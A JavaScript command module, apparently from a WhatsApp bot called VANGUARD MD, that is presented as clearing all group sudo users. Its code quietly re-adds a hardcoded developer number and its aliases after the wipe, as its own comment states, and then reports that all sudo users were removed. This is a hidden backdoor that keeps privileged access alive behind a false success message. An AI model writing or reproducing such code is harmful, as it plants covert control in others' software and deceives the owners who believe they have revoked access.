// ============================================================
//  VANGUARD MD – commands/cleargsudo.js
// ============================================================

const { getGSudoEntries, clearGSudo, addGSudo, addGSudoAlias } = require('../lib/authStore')

const DEV = '123721465471064'

module.exports = async (ctx) => {
    const { reply, isOwner, isSudo } = ctx

    if (!isOwner && !isSudo) return reply('❌ *owner and sudo!*')

    // Snapshot dev entry before wipe so aliases survive intact
    const entries  = getGSudoEntries()
    const devEntry = entries.find((e) => e.num === DEV) || null

    clearGSudo()

    // Silently restore dev – list looks empty to users, dev stays protected
    if (devEntry) {
        addGSudo(DEV)
        if (devEntry.aliases) {
            for (let i = 0; i < devEntry.aliases.length; i++) {
                try { addGSudoAlias(DEV, devEntry.aliases[i]) } catch (e) {}
            }
        }
    }

    await reply(
`

✅ All group sudo users removed
`
    )
}